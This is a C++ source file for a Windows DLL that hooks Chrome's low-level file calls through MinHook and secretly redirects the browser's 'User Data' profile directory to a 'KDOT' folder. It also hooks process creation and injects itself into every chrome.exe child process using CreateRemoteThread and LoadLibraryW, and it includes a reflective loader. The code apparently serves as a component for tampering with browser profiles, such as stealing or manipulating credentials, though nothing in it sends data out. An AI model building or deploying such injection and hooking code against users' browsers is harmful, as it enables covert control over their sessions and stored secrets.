#include "pch.h"
#include "MinHook.h"
#include "ReflectiveLoader.h"

//https://github.com/TsudaKageyu/minhook/releases/tag/v1.3.4
//go compare the hashes if you want
#pragma comment(lib, "libMinHook.x64.lib")
#pragma comment(lib, "ntdll.lib")

constexpr bool ENABLE_DEBUG_LOG = false;

pNtCreateFile OriginalNtCreateFile = nullptr;
pNtOpenFile OriginalNtOpenFile = nullptr;
pNtDeleteFile OriginalNtDeleteFile = nullptr;
pNtSetInformationFile OriginalNtSetInformationFile = nullptr;
pNtQueryAttributesFile OriginalNtQueryAttributesFile = nullptr;
pNtQueryFullAttributesFile OriginalNtQueryFullAttributesFile = nullptr;
pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = nullptr;
pNtQueryDirectoryFileEx OriginalNtQueryDirectoryFileEx = nullptr;

typedef BOOL(WINAPI* pCreateProcessW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

pCreateProcessW OriginalCreateProcessW = nullptr;
HMODULE g_hModule = nullptr;

const std::wstring SOURCE_PATH = L"\\??\\C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\User Data\\";
const std::wstring TARGET_PATH = L"\\??\\C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\KDOT\\";
const std::wstring SOURCE_PATH_NORM = L"C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\User Data\\";
const std::wstring TARGET_PATH_NORM = L"C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\KDOT\\";
const std::wstring SOURCE_PATH_NO_SLASH = L"\\??\\C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\User Data";
const std::wstring TARGET_PATH_NO_SLASH = L"\\??\\C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\KDOT";
const std::wstring SOURCE_PATH_NORM_NO_SLASH = L"C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\User Data";
const std::wstring TARGET_PATH_NORM_NO_SLASH = L"C:\\Users\\this1\\AppData\\Local\\Google\\Chrome\\KDOT";

std::wofstream logFile;

void Log(const std::wstring& message) {
    if constexpr (ENABLE_DEBUG_LOG) {
        if (logFile.is_open()) {
            logFile << message << std::endl;
            logFile.flush();
        }
    }
}

bool NeedsRedirection(const std::wstring& path) {
    bool needs = (path.find(L"User Data") != std::wstring::npos);

    if (needs) {
        Log(L"[MATCH] Path needs redirection: " + path);
    }
    else {
        if (path.find(L"Chrome") != std::wstring::npos || path.find(L"chrome") != std::wstring::npos) {
            Log(L"[NO MATCH] Chrome path but no redirect needed: " + path);
        }
    }

    return needs;
}

std::wstring ReplacePath(const std::wstring& originalPath) {
    std::wstring result = originalPath;

    const std::wstring searchStr = L"User Data";
    const std::wstring replaceStr = L"KDOT";

    size_t pos = 0;
    while ((pos = result.find(searchStr, pos)) != std::wstring::npos) {
        result.replace(pos, searchStr.length(), replaceStr);
        pos += replaceStr.length();
    }

    return result;
}

// NtCreateFile: Creates or opens a file/directory
NTSTATUS NTAPI HookedNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    PUNICODE_STRING originalString = nullptr;
    UNICODE_STRING newString = { 0 };
    WCHAR* buffer = nullptr;

    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        std::wstring originalPath(ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length / sizeof(WCHAR));
        Log(L"[NtCreateFile] Called with path: " + originalPath);

        if (NeedsRedirection(originalPath)) {
            std::wstring newPath = ReplacePath(originalPath);
            Log(L"[NtCreateFile] REDIRECTING: " + originalPath + L" -> " + newPath);

            size_t bufferSize = (newPath.length() + 1) * sizeof(WCHAR);
            buffer = (WCHAR*)malloc(bufferSize);
            if (buffer) {
                wcscpy_s(buffer, newPath.length() + 1, newPath.c_str());

                originalString = ObjectAttributes->ObjectName;
                newString.Buffer = buffer;
                newString.Length = (USHORT)(newPath.length() * sizeof(WCHAR));
                newString.MaximumLength = (USHORT)bufferSize;
                ObjectAttributes->ObjectName = &newString;
            }
        }
    }

    NTSTATUS result = OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
        AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength);

    if (originalString) {
        ObjectAttributes->ObjectName = originalString;
        if (buffer) {
            free(buffer);
        }
    }

    return result;
}

// NtOpenFile: Opens an existing file/directory
NTSTATUS NTAPI HookedNtOpenFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions
) {
    PUNICODE_STRING originalString = nullptr;
    UNICODE_STRING newString = { 0 };
    WCHAR* buffer = nullptr;

    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        std::wstring originalPath(ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length / sizeof(WCHAR));

        if (NeedsRedirection(originalPath)) {
            std::wstring newPath = ReplacePath(originalPath);
            Log(L"NtOpenFile - Redirected: " + originalPath + L" -> " + newPath);

            size_t bufferSize = (newPath.length() + 1) * sizeof(WCHAR);
            buffer = (WCHAR*)malloc(bufferSize);
            if (buffer) {
                wcscpy_s(buffer, newPath.length() + 1, newPath.c_str());

                originalString = ObjectAttributes->ObjectName;
                newString.Buffer = buffer;
                newString.Length = (USHORT)(newPath.length() * sizeof(WCHAR));
                newString.MaximumLength = (USHORT)bufferSize;
                ObjectAttributes->ObjectName = &newString;
            }
        }
    }

    NTSTATUS result = OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    if (originalString) {
        ObjectAttributes->ObjectName = originalString;
        if (buffer) {
            free(buffer);
        }
    }

    return result;
}

// NtDeleteFile: Deletes a file
NTSTATUS NTAPI HookedNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes) {
    PUNICODE_STRING originalString = nullptr;
    UNICODE_STRING newString = { 0 };
    WCHAR* buffer = nullptr;

    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        std::wstring originalPath(ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length / sizeof(WCHAR));

        if (NeedsRedirection(originalPath)) {
            std::wstring newPath = ReplacePath(originalPath);
            Log(L"NtDeleteFile - Redirected: " + originalPath + L" -> " + newPath);

            size_t bufferSize = (newPath.length() + 1) * sizeof(WCHAR);
            buffer = (WCHAR*)malloc(bufferSize);
            if (buffer) {
                wcscpy_s(buffer, newPath.length() + 1, newPath.c_str());

                originalString = ObjectAttributes->ObjectName;
                newString.Buffer = buffer;
                newString.Length = (USHORT)(newPath.length() * sizeof(WCHAR));
                newString.MaximumLength = (USHORT)bufferSize;
                ObjectAttributes->ObjectName = &newString;
            }
        }
    }

    NTSTATUS result = OriginalNtDeleteFile(ObjectAttributes);

    if (originalString) {
        ObjectAttributes->ObjectName = originalString;
        if (buffer) {
            free(buffer);
        }
    }

    return result;
}

// NtSetInformationFile: Sets file metadata (handles file renames)
NTSTATUS NTAPI HookedNtSetInformationFile(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass
) {
    const int FileRenameInfo = 10;
    const int FileRenameInfoEx = 65;

    if (FileInformation && (FileInformationClass == (FILE_INFORMATION_CLASS)FileRenameInfo || FileInformationClass == (FILE_INFORMATION_CLASS)FileRenameInfoEx)) {
        struct FILE_RENAME_INFO {
            BOOLEAN ReplaceIfExists;
            HANDLE RootDirectory;
            ULONG FileNameLength;
            WCHAR FileName[1];
        };

        FILE_RENAME_INFO* renameInfo = (FILE_RENAME_INFO*)FileInformation;
        if (renameInfo->FileNameLength > 0) {
            std::wstring originalPath(renameInfo->FileName, renameInfo->FileNameLength / sizeof(WCHAR));

            if (NeedsRedirection(originalPath)) {
                std::wstring newPath = ReplacePath(originalPath);
                Log(L"NtSetInformationFile (Rename) - Redirected: " + originalPath + L" -> " + newPath);

                // Allocate new buffer with the modified rename info
                ULONG newInfoSize = sizeof(FILE_RENAME_INFO) - sizeof(WCHAR) + (newPath.length() * sizeof(WCHAR));
                FILE_RENAME_INFO* newRenameInfo = (FILE_RENAME_INFO*)malloc(newInfoSize);

                if (newRenameInfo) {
                    newRenameInfo->ReplaceIfExists = renameInfo->ReplaceIfExists;
                    newRenameInfo->RootDirectory = renameInfo->RootDirectory;
                    newRenameInfo->FileNameLength = (ULONG)(newPath.length() * sizeof(WCHAR));
                    memcpy(newRenameInfo->FileName, newPath.c_str(), newRenameInfo->FileNameLength);

                    NTSTATUS result = OriginalNtSetInformationFile(FileHandle, IoStatusBlock, newRenameInfo, newInfoSize, FileInformationClass);
                    free(newRenameInfo);
                    return result;
                }
            }
        }
    }

    return OriginalNtSetInformationFile(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
}

// NtQueryAttributesFile: Queries basic file attributes
NTSTATUS NTAPI HookedNtQueryAttributesFile(
    POBJECT_ATTRIBUTES ObjectAttributes,
    PVOID FileInformation
) {
    PUNICODE_STRING originalString = nullptr;
    UNICODE_STRING newString = { 0 };
    WCHAR* buffer = nullptr;

    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        std::wstring originalPath(ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length / sizeof(WCHAR));

        if (NeedsRedirection(originalPath)) {
            std::wstring newPath = ReplacePath(originalPath);
            Log(L"NtQueryAttributesFile - Redirected: " + originalPath + L" -> " + newPath);

            size_t bufferSize = (newPath.length() + 1) * sizeof(WCHAR);
            buffer = (WCHAR*)malloc(bufferSize);
            if (buffer) {
                wcscpy_s(buffer, newPath.length() + 1, newPath.c_str());

                originalString = ObjectAttributes->ObjectName;
                newString.Buffer = buffer;
                newString.Length = (USHORT)(newPath.length() * sizeof(WCHAR));
                newString.MaximumLength = (USHORT)bufferSize;
                ObjectAttributes->ObjectName = &newString;
            }
        }
    }

    NTSTATUS result = OriginalNtQueryAttributesFile(ObjectAttributes, FileInformation);

    if (originalString) {
        ObjectAttributes->ObjectName = originalString;
        if (buffer) {
            free(buffer);
        }
    }

    return result;
}

// NtQueryFullAttributesFile: Queries extended file attributes
NTSTATUS NTAPI HookedNtQueryFullAttributesFile(
    POBJECT_ATTRIBUTES ObjectAttributes,
    PVOID FileInformation
) {
    PUNICODE_STRING originalString = nullptr;
    UNICODE_STRING newString = { 0 };
    WCHAR* buffer = nullptr;

    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        std::wstring originalPath(ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length / sizeof(WCHAR));

        if (NeedsRedirection(originalPath)) {
            std::wstring newPath = ReplacePath(originalPath);
            Log(L"NtQueryFullAttributesFile - Redirected: " + originalPath + L" -> " + newPath);

            size_t bufferSize = (newPath.length() + 1) * sizeof(WCHAR);
            buffer = (WCHAR*)malloc(bufferSize);
            if (buffer) {
                wcscpy_s(buffer, newPath.length() + 1, newPath.c_str());

                originalString = ObjectAttributes->ObjectName;
                newString.Buffer = buffer;
                newString.Length = (USHORT)(newPath.length() * sizeof(WCHAR));
                newString.MaximumLength = (USHORT)bufferSize;
                ObjectAttributes->ObjectName = &newString;
            }
        }
    }

    NTSTATUS result = OriginalNtQueryFullAttributesFile(ObjectAttributes, FileInformation);

    if (originalString) {
        ObjectAttributes->ObjectName = originalString;
        if (buffer) {
            free(buffer);
        }
    }

    return result;
}

// NtQueryDirectoryFile: Enumerates directory contents
NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    return OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName, RestartScan);
}

// NtQueryDirectoryFileEx: Extended directory enumeration
NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
) {
    return OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        QueryFlags, FileName);
}

// Injects DLL into target process
BOOL InjectDLL(HANDLE hProcess, const wchar_t* dllPath) {
    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remotePath = VirtualAllocEx(hProcess, nullptr, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remotePath) {
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remotePath, dllPath, pathSize, nullptr)) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return FALSE;
    }
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    if (!pLoadLibraryW) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW, remotePath, 0, nullptr);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return TRUE;
    }

    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    return FALSE;
}

// CreateProcessW hook: Injects into Chrome child processes
BOOL WINAPI HookedCreateProcessW(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
) {
    DWORD flags = dwCreationFlags | CREATE_SUSPENDED;

    BOOL result = OriginalCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
        lpThreadAttributes, bInheritHandles, flags, lpEnvironment,
        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

    if (result) {
        std::wstring cmdLine = lpCommandLine ? lpCommandLine : L"";
        std::wstring appName = lpApplicationName ? lpApplicationName : L"";

        if (cmdLine.find(L"chrome.exe") != std::wstring::npos ||
            appName.find(L"chrome.exe") != std::wstring::npos) {

            wchar_t dllPath[MAX_PATH];
            GetModuleFileNameW(g_hModule, dllPath, MAX_PATH);

            Log(L"[CreateProcessW] Injecting into child process: " + cmdLine);
            InjectDLL(lpProcessInformation->hProcess, dllPath);
        }

        if (!(dwCreationFlags & CREATE_SUSPENDED)) {
            ResumeThread(lpProcessInformation->hThread);
        }
    }

    return result;
}

void InstallHooks() {
    if constexpr (ENABLE_DEBUG_LOG) {
        logFile.open(L"C:\\Users\\this1\\hook_log.txt", std::ios::out | std::ios::app);
    }
    Log(L"=== DLL Loaded ===");

    if (MH_Initialize() != MH_OK) {
        Log(L"Failed to initialize MinHook");
        return;
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        Log(L"Failed to get ntdll.dll handle");
        return;
    }

    FARPROC pNtCreateFile = GetProcAddress(ntdll, "NtCreateFile");
    if (pNtCreateFile && MH_CreateHook(pNtCreateFile, &HookedNtCreateFile, reinterpret_cast<LPVOID*>(&OriginalNtCreateFile)) == MH_OK) {
        MH_EnableHook(pNtCreateFile);
        Log(L"Hooked NtCreateFile");
    }

    FARPROC pNtOpenFile = GetProcAddress(ntdll, "NtOpenFile");
    if (pNtOpenFile && MH_CreateHook(pNtOpenFile, &HookedNtOpenFile, reinterpret_cast<LPVOID*>(&OriginalNtOpenFile)) == MH_OK) {
        MH_EnableHook(pNtOpenFile);
        Log(L"Hooked NtOpenFile");
    }

    FARPROC pNtDeleteFile = GetProcAddress(ntdll, "NtDeleteFile");
    if (pNtDeleteFile && MH_CreateHook(pNtDeleteFile, &HookedNtDeleteFile, reinterpret_cast<LPVOID*>(&OriginalNtDeleteFile)) == MH_OK) {
        MH_EnableHook(pNtDeleteFile);
        Log(L"Hooked NtDeleteFile");
    }

    FARPROC pNtSetInformationFile = GetProcAddress(ntdll, "NtSetInformationFile");
    if (pNtSetInformationFile && MH_CreateHook(pNtSetInformationFile, &HookedNtSetInformationFile, reinterpret_cast<LPVOID*>(&OriginalNtSetInformationFile)) == MH_OK) {
        MH_EnableHook(pNtSetInformationFile);
        Log(L"Hooked NtSetInformationFile");
    }

    FARPROC pNtQueryAttributesFile = GetProcAddress(ntdll, "NtQueryAttributesFile");
    if (pNtQueryAttributesFile && MH_CreateHook(pNtQueryAttributesFile, &HookedNtQueryAttributesFile, reinterpret_cast<LPVOID*>(&OriginalNtQueryAttributesFile)) == MH_OK) {
        MH_EnableHook(pNtQueryAttributesFile);
        Log(L"Hooked NtQueryAttributesFile");
    }

    FARPROC pNtQueryFullAttributesFile = GetProcAddress(ntdll, "NtQueryFullAttributesFile");
    if (pNtQueryFullAttributesFile && MH_CreateHook(pNtQueryFullAttributesFile, &HookedNtQueryFullAttributesFile, reinterpret_cast<LPVOID*>(&OriginalNtQueryFullAttributesFile)) == MH_OK) {
        MH_EnableHook(pNtQueryFullAttributesFile);
        Log(L"Hooked NtQueryFullAttributesFile");
    }

    FARPROC pNtQueryDirectoryFile = GetProcAddress(ntdll, "NtQueryDirectoryFile");
    if (pNtQueryDirectoryFile && MH_CreateHook(pNtQueryDirectoryFile, &HookedNtQueryDirectoryFile, reinterpret_cast<LPVOID*>(&OriginalNtQueryDirectoryFile)) == MH_OK) {
        MH_EnableHook(pNtQueryDirectoryFile);
        Log(L"Hooked NtQueryDirectoryFile");
    }

    FARPROC pNtQueryDirectoryFileEx = GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
    if (pNtQueryDirectoryFileEx && MH_CreateHook(pNtQueryDirectoryFileEx, &HookedNtQueryDirectoryFileEx, reinterpret_cast<LPVOID*>(&OriginalNtQueryDirectoryFileEx)) == MH_OK) {
        MH_EnableHook(pNtQueryDirectoryFileEx);
        Log(L"Hooked NtQueryDirectoryFileEx");
    }

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (kernel32) {
        FARPROC pCreateProcessW = GetProcAddress(kernel32, "CreateProcessW");
        if (pCreateProcessW && MH_CreateHook(pCreateProcessW, &HookedCreateProcessW, reinterpret_cast<LPVOID*>(&OriginalCreateProcessW)) == MH_OK) {
            MH_EnableHook(pCreateProcessW);
            Log(L"Hooked CreateProcessW");
        }
    }

    Log(L"All hooks installed");
}

void RemoveHooks() {
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();

    Log(L"=== DLL Unloaded ===");

    if constexpr (ENABLE_DEBUG_LOG) {
        if (logFile.is_open()) {
            logFile.close();
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hModule = hModule;
        DisableThreadLibraryCalls(hModule);
        InstallHooks();
        break;
    case DLL_PROCESS_DETACH:
        RemoveHooks();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

